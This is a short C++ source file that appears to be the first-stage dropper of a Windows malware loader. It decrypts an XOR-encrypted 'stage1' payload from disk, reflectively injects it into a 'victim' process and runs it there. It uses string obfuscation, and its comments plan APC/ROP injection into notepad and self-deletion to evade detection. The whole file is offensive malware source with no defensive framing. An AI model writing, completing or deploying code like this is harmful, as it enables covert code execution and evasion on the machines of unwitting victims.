#include "File.hpp"
#include "Exception.hpp"
#include "Encryption.hpp"
#include "DefinesMacros.hpp"
#include "ReflectiveLoader.hpp"

static const std::string_view STAGE1_ENCRYPTED_FILENAME = OBFUSCATE("stage1_encrypted.bin");

int wWinMain(
    UNUSED(_In_ HINSTANCE hInstance),
    UNUSED(_In_opt_ HINSTANCE hPrevInstance),
    UNUSED(_In_ LPWSTR lpCmdLine),
    UNUSED(_In_ int nShowCmd)
)
{
    // protections

    try
    {
        // inject a APC/rop into notepad or something to delete the stage0

        // Self delete APC class -> make root class
        // self delete ROP class

        File stage1_encrypted_file(STAGE1_ENCRYPTED_FILENAME, FileAccess::GenericRead, FileShare::None, FileCreationDisposition::OpenExisting);
        ByteVector stage1_encrypted = stage1_encrypted_file.read(stage1_encrypted_file.size());
        ByteVector stage1 = simple_encryption::xor_bytes_with_hardcoded_key(stage1_encrypted);

        ReflectiveLoader stage1_loader(stage1, lpCmdLine);
        stage1_loader.inject_module();
        stage1_loader.run_module_in_victim();

        // SelfDeleteAPC().delete();
    }
    CATCH_ALL(OBFUSCATE("Exception caught in Stage0 main!"))

	return 0;
}